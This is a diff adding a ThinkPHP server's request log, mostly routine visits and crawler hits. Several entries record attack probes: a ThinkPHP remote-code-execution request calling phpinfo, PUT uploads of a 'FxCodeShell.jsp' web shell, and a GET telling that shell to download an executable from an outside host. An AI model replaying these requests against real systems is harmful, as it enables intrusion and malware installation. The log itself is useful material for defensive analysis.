@@ -1,0 +1,1039 @@
+---------------------------------------------------------------
+[2019-10-06T00:08:04+08:00] 222.186.130.22 GET 123.57.56.8/TP/public/index.php
+[运行时间：0.460397s] [吞吐率：2.17req/s] [内存消耗：1,971.52kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T00:08:04+08:00] 222.186.130.22 GET 123.57.56.8/TP/index.php
+[运行时间：0.031496s] [吞吐率：31.75req/s] [内存消耗：1,971.52kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T00:08:04+08:00] 222.186.130.22 GET 123.57.56.8/thinkphp/html/public/index.php
+[运行时间：0.029676s] [吞吐率：33.70req/s] [内存消耗：1,971.54kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T00:08:04+08:00] 222.186.130.22 GET 123.57.56.8/html/public/index.php
+[运行时间：0.028237s] [吞吐率：35.41req/s] [内存消耗：1,971.53kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T00:08:04+08:00] 222.186.130.22 GET 123.57.56.8/public/index.php
+[运行时间：0.029111s] [吞吐率：34.35req/s] [内存消耗：1,971.53kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T00:08:04+08:00] 222.186.130.22 GET 123.57.56.8/TP/html/public/index.php
+[运行时间：0.033902s] [吞吐率：29.50req/s] [内存消耗：1,971.54kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T00:08:04+08:00] 222.186.130.22 GET 123.57.56.8/elrekt.php
+[运行时间：0.029418s] [吞吐率：33.99req/s] [内存消耗：1,971.52kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T00:08:05+08:00] 222.186.130.22 GET 123.57.56.8/index.php
+[运行时间：0.060939s] [吞吐率：16.41req/s] [内存消耗：2,210.75kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'host' => '123.57.56.8',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T00:08:05+08:00] 222.186.130.22 GET 123.57.56.8/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+[运行时间：0.026387s] [吞吐率：37.90req/s] [内存消耗：1,949.71kb] [文件加载：124]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T00:08:05+08:00] 222.186.130.22 POST 123.57.56.8/index.php?s=captcha
+[运行时间：0.029054s] [吞吐率：34.42req/s] [内存消耗：1,971.30kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T00:08:05+08:00] 222.186.130.22 GET 123.57.56.8:80/
+[运行时间：0.028984s] [吞吐率：34.50req/s] [内存消耗：2,210.79kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'host' => '123.57.56.8:80',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T02:31:47+08:00] 157.55.39.140 GET www.aizhuanbao.cn/
+[运行时间：0.030711s] [吞吐率：32.56req/s] [内存消耗：2,211.73kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'www.aizhuanbao.cn',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T03:24:57+08:00] 1.55.243.196 GET 123.57.56.8:80/
+[运行时间：0.029241s] [吞吐率：34.20req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T03:26:52+08:00] 47.97.192.46 GET www.aizhuanbao.cn/
+[运行时间：0.388824s] [吞吐率：2.57req/s] [内存消耗：2,210.74kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.aizhuanbao.cn',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T03:34:44+08:00] 47.98.96.116 GET maxthink.cn/
+[运行时间：0.044269s] [吞吐率：22.59req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'maxthink.cn',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T03:34:47+08:00] 101.132.193.68 GET www.maxthink.cn/
+[运行时间：0.033077s] [吞吐率：30.23req/s] [内存消耗：2,210.73kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.maxthink.cn',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T03:38:32+08:00] 101.132.188.111 GET aizhuanbao.cn/
+[运行时间：0.030833s] [吞吐率：32.43req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'aizhuanbao.cn',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T03:47:42+08:00] 47.100.53.146 GET maxthink.cn/
+[运行时间：0.033594s] [吞吐率：29.77req/s] [内存消耗：2,210.69kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'maxthink.cn',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X)',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T03:53:03+08:00] 47.97.220.124 GET www.maxthink.cn/
+[运行时间：0.031719s] [吞吐率：31.53req/s] [内存消耗：2,210.72kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.maxthink.cn',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X)',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T04:06:24+08:00] 47.101.185.36 GET www.maxthink.cn/
+[运行时间：0.041080s] [吞吐率：24.34req/s] [内存消耗：2,210.75kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.maxthink.cn',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T04:15:37+08:00] 47.100.8.254 GET joke.aizhuanbao.cn/
+[运行时间：0.032736s] [吞吐率：30.55req/s] [内存消耗：2,210.76kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'joke.aizhuanbao.cn',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T04:33:35+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
+[运行时间：0.300186s] [吞吐率：3.33req/s] [内存消耗：1,971.41kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T04:40:52+08:00] 47.101.199.131 GET www.aizhuanbao.cn/
+[运行时间：0.034791s] [吞吐率：28.74req/s] [内存消耗：2,210.76kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.aizhuanbao.cn',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T04:49:05+08:00] 120.79.217.140 GET 123.57.56.8/
+[运行时间：0.029700s] [吞吐率：33.67req/s] [内存消耗：2,210.76kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '123.57.56.8',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T04:56:52+08:00] 47.101.56.197 GET maxthink.cn/
+[运行时间：0.032293s] [吞吐率：30.97req/s] [内存消耗：2,210.72kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'maxthink.cn',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T05:05:49+08:00] 157.255.17.17 GET 123.57.56.8/index.php
+[运行时间：0.060715s] [吞吐率：16.47req/s] [内存消耗：2,211.13kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://123.57.56.8:80/index.php',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'host' => '123.57.56.8',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T05:45:22+08:00] 47.101.199.232 GET aizhuanbao.cn/
+[运行时间：0.036124s] [吞吐率：27.68req/s] [内存消耗：2,210.72kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'aizhuanbao.cn',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T05:49:26+08:00] 157.55.39.140 GET www.aizhuanbao.cn/
+[运行时间：0.032935s] [吞吐率：30.36req/s] [内存消耗：2,212.36kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'www.aizhuanbao.cn',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T05:58:53+08:00] 176.241.94.228 GET 123.57.56.8:80/
+[运行时间：0.030434s] [吞吐率：32.86req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T06:08:16+08:00] 165.16.37.175 GET 123.57.56.8:80/
+[运行时间：0.029877s] [吞吐率：33.47req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T07:15:31+08:00] 42.236.103.66 GET www.aizhuanbao.cn/
+[运行时间：0.032661s] [吞吐率：30.62req/s] [内存消耗：2,212.03kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider',
+  'connection' => 'Keep-Alive',
+  'accept-language' => 'zh-CN',
+  'accept' => '*/*',
+  'cookie' => '',
+  'referer' => 'http://www.aizhuanbao.cn/',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'www.aizhuanbao.cn',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T07:15:37+08:00] 42.236.12.170 GET aizhuanbao.cn/
+[运行时间：0.032113s] [吞吐率：31.14req/s] [内存消耗：2,211.98kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider',
+  'connection' => 'Keep-Alive',
+  'accept-language' => 'zh-CN',
+  'accept' => '*/*',
+  'cookie' => '',
+  'referer' => 'http://aizhuanbao.cn/',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'aizhuanbao.cn',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T07:24:11+08:00] 123.57.12.247 PUT 123.57.56.8/FxCodeShell.jsp%20
+[运行时间：0.089717s] [吞吐率：11.15req/s] [内存消耗：1,983.12kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T07:24:11+08:00] 123.57.12.247 PUT 123.57.56.8/FxCodeShell.jsp::$DATA
+[运行时间：0.027726s] [吞吐率：36.07req/s] [内存消耗：1,983.12kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T07:24:11+08:00] 123.57.12.247 PUT 123.57.56.8/FxCodeShell.jsp/
+[运行时间：0.026530s] [吞吐率：37.69req/s] [内存消耗：1,983.10kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T07:24:11+08:00] 123.57.12.247 GET 123.57.56.8/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fky.dfg45dfg45.best/download.exe
+[运行时间：0.025983s] [吞吐率：38.49req/s] [内存消耗：1,972.06kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T07:29:43+08:00] 138.68.212.45 GET 123.57.56.8/manager/text/list
+[运行时间：0.028113s] [吞吐率：35.57req/s] [内存消耗：1,971.46kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T08:26:43+08:00] 47.100.202.153 GET 123.57.56.8/
+[运行时间：0.034655s] [吞吐率：28.86req/s] [内存消耗：2,210.76kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '123.57.56.8',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T08:27:44+08:00] 17.58.99.113 GET www.aizhuanbao.cn/
+[运行时间：0.034129s] [吞吐率：29.30req/s] [内存消耗：2,211.14kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)',
+  'accept' => '*/*',
+  'host' => 'www.aizhuanbao.cn',
+  'accept-encoding' => 'gzip, identity',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T09:15:46+08:00] 109.125.172.155 GET 123.57.56.8:80/
+[运行时间：0.030051s] [吞吐率：33.28req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T09:32:22+08:00] 36.91.90.171 GET 123.57.56.8:80/
+[运行时间：0.038141s] [吞吐率：26.22req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T10:09:54+08:00] 54.200.94.232 GET aizhuanbao.cn/
+[运行时间：0.030644s] [吞吐率：32.63req/s] [内存消耗：2,210.33kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Go-http-client/1.1',
+  'host' => 'aizhuanbao.cn',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T10:29:42+08:00] 77.153.150.59 GET 123.57.56.8/
+[运行时间：0.399887s] [吞吐率：2.50req/s] [内存消耗：2,209.99kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '123.57.56.8',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T11:16:59+08:00] 159.203.201.112 GET 123.57.56.8/manager/html
+[运行时间：0.278957s] [吞吐率：3.58req/s] [内存消耗：1,971.45kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T11:47:17+08:00] 171.67.70.80 GET 123.57.56.8/
+[运行时间：0.053800s] [吞吐率：18.59req/s] [内存消耗：2,210.46kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'host' => '123.57.56.8',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T12:51:56+08:00] 142.11.229.181 GET www.baidu.com/
+[运行时间：0.395622s] [吞吐率：2.53req/s] [内存消耗：2,210.50kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.baidu.com',
+  'connection' => 'close',
+  'user-agent' => 'Python-urllib/3.4',
+  'accept-encoding' => 'identity',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T13:09:16+08:00] 223.104.37.1 POST 123.57.56.8/app/api.php
+[运行时间：0.425634s] [吞吐率：2.35req/s] [内存消耗：1,970.93kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T13:38:17+08:00] 42.236.99.37 GET www.aizhuanbao.cn/
+[运行时间：0.031880s] [吞吐率：31.37req/s] [内存消耗：2,212.06kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
+  'connection' => 'Keep-Alive',
+  'accept-language' => 'zh-CN',
+  'accept' => '*/*',
+  'cookie' => '',
+  'referer' => 'http://www.aizhuanbao.cn/',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'www.aizhuanbao.cn',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T13:52:45+08:00] 31.7.66.33 GET 123.57.56.8:80/
